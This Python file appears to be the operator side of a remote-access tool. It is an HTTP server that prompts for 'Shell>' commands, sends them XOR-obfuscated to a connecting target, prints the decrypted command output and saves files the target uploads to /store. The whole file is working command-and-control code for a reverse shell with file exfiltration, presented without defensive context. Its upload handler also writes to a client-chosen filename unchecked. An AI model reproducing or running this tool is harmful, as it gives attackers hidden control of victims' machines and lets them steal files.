from http.server import BaseHTTPRequestHandler    # SimpleHTTPRequestHandler
from socketserver import TCPServer
import os
from cgi import parse_header, FieldStorage



class ServerHandler(BaseHTTPRequestHandler): 
    # ServerHandler defines what we should do when we receive a GET/POST request
    key = 'E5c(;7=>-u%9Zd0IT!dbYJ3&(j~q=FBt.%;bh1<EH5|/-[;=HqsRNgM%|O,T{vX9->Nds8n4?H?I~S9kzzqOln4Xn%fQt4aI:0xJmG1#FG{20YHZ.-ZfeAGh&qH:]RtC^KUo#(aJ1[zFJErWRz}Vmw%~W^${X75t$P7jf(}ZtBD}D:IoXjv/_X|T|WjJhGpc0Y^2LGMj|w_xBHK3xFus5lwFHllS0XpUZtpo9^^<Ps%aGsL2L-dL[$[7x$j_%1jy!bj2P[Q:mhVwP_N}){x7Lc?G$qe4WN!}+9xSP{(}<e}14Z-i5Vm}^;UJ.LC]Q62.|n.&,P#!%PUWg,B!9H8LYK0KanpLk<s?!5{[y.C^WtX.ChDVrnTbYZ4ub5v-D}W]4#%A28YQbSQF.[LwUx>Iw!mK;cm1U$p-6>Ewrs?U)z[p8uAtYvH0%FuYz9<]bbc=teDUcgOaOc6g4Q,ry^4;oc3I0Z?:19](CLU/rJ{_8B2Th6mtz/J1_4,yiko3V0eqT2HANzyJ!0Ug&YET~%0qN_c~F=?W[mP-6r>&X9aqS#R-eS4mw_Y!>&L.uniEn!}7z.}[h8GiNtGj:>.0{R?]Nf7r[5+pfI?FcU0#^w$F~t]+:#Q~+4^wdMq96PE!d^R#k)V/w^i^.AZ&~S|63KS{4R)62$>8Yz2HmmV;6G&8h(S6Tf{PbAsjtieOX:Po%+Xr+b],p7lrBFpfKksX^LUV}ryx,-s5r6D]}25Tl5A-E4+WUKS=vp7l0:qnx88W:KrtAlY){^Bo.03,48ZAqST]2h6v{/Bh=V=vOi)71U9aX6hL</]0ioG0;)h}!#tzfmM?vV+_!c4uFeC;uNFNMAuQ;)>}luze!.It&]!n-zMoZ2z&=?aO=b>Xd[mBn+1w%Q>po_lCJ-+V;O9v_.gL}0gH:CT6|ZW/6u<:JIBZ!Cr53H!Eqc)BCeD;-}i}0+K{OTRS8e1ffy#Y8czMo9c;O/W7Kk(:i}UI5%>.0QIq,[Qv,&^McoP8KXwUm6TC}exdR8Ac'
    
    def str_xor(self, s1, s2):
        ''' Encrypt/Decrypt function '''
        return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])
    
    # from the client / target
    def do_GET(self):
        # on GET request 
        command = input("Shell> ")
        # return HTML status 200 (OK)
        self.send_response(200)
        # Inform the target that content type header is "text/html"
        self.send_header("Content-type", "text/html")
        self.end_headers() 
        # send the command which we got from the user input
        self.wfile.write(self.str_xor(command, self.key).encode())

    def do_POST(self):
        # on POST request 
        if self.path == '/store':
            try:
                
                ctype, pdict = parse_header(self.headers.get('content-type'))
                if ctype == 'multipart/form-data':
                    fs = FieldStorage( fp = self.rfile, headers = self.headers, environ={ 'REQUEST_METHOD':'POST' } )
                else:
                    print ("[!] Unexpected POST request")

                # on the client side we submitted the file,
                # Now here to retrieve the actual file, we use the corresponding key 'file'
                fs_up = fs['file']
                filename = fs['filename'].value
                # create a file holder called '1.txt' and write the received file into this '1.txt'
                with open(filename, 'wb') as o:  
                    o.write( fs_up.file.read() )
                    self.send_response(200)
                    self.end_headers()
            except Exception as e:
                print(e)
            # once we store the received file, exit the function
            return 
        # return HTML status 200 (OK)
        self.send_response(200)
        self.end_headers()
        # Define the length of bytes HTTP POST data contains, value must be integer
        length = int(self.headers['Content-Length'])
        # Read then print the posted data
        post_value = self.str_xor(self.rfile.read(length).decode(), self.key)
        print(post_value)

class WebServer():
    def __init__(self, port=5000, verbose=True):
        """ Constructs a restartable WebServer on 'PORT'. """
        self.IP = '<SERVER-IP-ADDRESS>'
        self.PORT = port
        self._verbose = verbose
        self._handler = ServerHandler

    def run(self):
        """ Serve forever, restart when allowed. """
        with TCPServer((self.IP, self.PORT), self._handler) as httpd:
            if self._verbose:
                print('[ WEB SERVER ] Serving at port:', self.PORT)
            try:
                httpd.serve_forever()
            except KeyboardInterrupt:
                httpd.server_close()
                print('[ WEB SERVER ] Closing connection.')

def main():
    w = WebServer()
    w.run()
  

if __name__ == "__main__":
    main()